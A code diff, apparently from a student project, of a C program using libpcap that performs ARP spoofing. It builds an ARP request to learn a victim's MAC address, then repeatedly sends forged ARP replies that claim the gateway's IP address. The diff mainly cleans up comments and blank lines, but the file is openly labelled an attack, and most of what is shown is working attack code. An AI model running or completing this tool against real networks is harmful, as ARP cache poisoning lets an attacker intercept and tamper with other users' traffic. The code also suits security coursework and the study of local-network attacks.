@@ -29,10 +29,7 @@ void make_sender_packet(struct combine_packet* compacket, u_char* sArr){
         compacket->ether.ether_shost[i] = temp[i]; // 아무값이나 상관없음
     }
 
-
     compacket->ether.ether_type = htons(ARP); //ether_type 저장
-
-    // arp 저장
 
     compacket->arp.hd_type =htons(0x0001);
     compacket->arp.pr_type =htons(0x0800);
@@ -48,30 +45,23 @@ void make_sender_packet(struct combine_packet* compacket, u_char* sArr){
     }
 
 
-
     for(i=0;i<4;i++) // 내 주소값
-    {compacket->arp.send_ip_ad[i] = temp[i]; // 아무값이나 상관없음?
+    {compacket->arp.send_ip_ad[i] = temp[i]; // 아무값이나 상관없음
 
     }
 
-
     uint8_t sss[6] = {0,0,0,0,0,0};
-    memcpy(compacket->arp.target_mac_ad, sss, 6);// 아무값이나 상과없음?
+    memcpy(compacket->arp.target_mac_ad, sss, 6);// 아무값이나 상관없음
 
 
-
-    for(i=0;i<6;i++) // arp_sender_mac_ad 값 저장
+    for(i=0;i<6;i++)
     {
         compacket->arp.target_ip_ad[i] = sArr[i]; // 아무값이나 상관없음
     }
 
-
-
-
 }
 
-// sender mac 주소 저장하는 패킷
-// 내가 공격자 일때, 죽을 상대방 = sener
+// sender mac 주소 저장하는 함수
 int get_target_mac(const int8_t* packet,char* get_mac){
     int i;
 
@@ -88,7 +78,7 @@ int get_target_mac(const int8_t* packet,char* get_mac){
 
 }
 
-// 공격 패킷
+// 공격
 void make_attacker_packet(struct combine_packet* compacket, u_char* sender_ip,u_char* gateway_ip){
     //TODO str에  sender패킷이 되기위함을 준비
     // 패킷에 FFFFF~ 와 gateway, sender ip를 설정한다.
@@ -120,7 +110,7 @@ void make_attacker_packet(struct combine_packet* compacket, u_char* sender_ip,u_
     compacket->arp.hd_size =0x06;
 
 
-    compacket->arp.opCode = htons(Reply);  //when request,
+    compacket->arp.opCode = htons(Reply);  //when reply,
 
 
     for(i=0;i<6;i++)
@@ -128,9 +118,6 @@ void make_attacker_packet(struct combine_packet* compacket, u_char* sender_ip,u_
 
     for(i=0;i<4;i++)
     {compacket->arp.send_ip_ad[i] = gateway_ip[i];}
-
-
-
 
 
     for(i=0;i<6;i++)
@@ -157,12 +144,9 @@ int main(int argc, char* argv[]) {
 
 
     int i = 0;
-    // 두번째 친구 읽어옴
     char *gateway_ip = argv[3];
     char sArr[4] = {0,};
     char* sender_ip = strtok(argv[2], "."); //공백을 기준으로 문자열 나눔
-
-    //TODO sender_ip를 패킷에 넣어줄 것
 
     while (sender_ip != NULL)  // 공백이 나올때까지 계속 문자열을 자름
     {
@@ -179,7 +163,7 @@ int main(int argc, char* argv[]) {
 
     make_sender_packet(&compacket, (u_char *)sArr); // broadcast로 보내는 패킷
 
-
+    // TODO test끝나면 주석 지울것.
     /*
     if (argc != 4)  // 오류처리
     {
@@ -194,14 +178,8 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
         return -1;
     }
-/*
- *  memcpy(ahdksadksadkjas->ether_shost, aksdjam, 6);
- *
- *
- * */
 
 
-    // make_sender_packet(&compacket,(u_char*)sender_ip); // broadcast로 보내는 패킷
     uint8_t buf[42];
     uint8_t tip[4] = {192, 168, 41, 10};
     memcpy(buf, &compacket, 42 - 4);
@@ -226,7 +204,8 @@ int main(int argc, char* argv[]) {
         else{
             continue;}
     }
-        printf(" \n========while DONE==============\n");
+
+    printf(" \n========while DONE==============\n");
 
     make_attacker_packet(&compacket,(u_char*)&sender_ip,(u_char*)&gateway_ip );
 
@@ -234,12 +213,14 @@ int main(int argc, char* argv[]) {
         pcap_sendpacket(handle, (const u_char *) &packet, 42);
         sleep(1);
     }
-    // 여기서부터 공격입니다 열심히 하세요77
 
-    // 공격 패킷 만들기 전 작업
+    // 공격패킷 부르기
     // make_sender_packet(&compacket,(u_char*)sender_ip,(u_char*)gateway_ip); // broadcast로 보내는 패킷
-
     // make_sender_packet의 필요한 부분만 변경해서 반환시킴
+
+
+
+
 
 
     return 0;
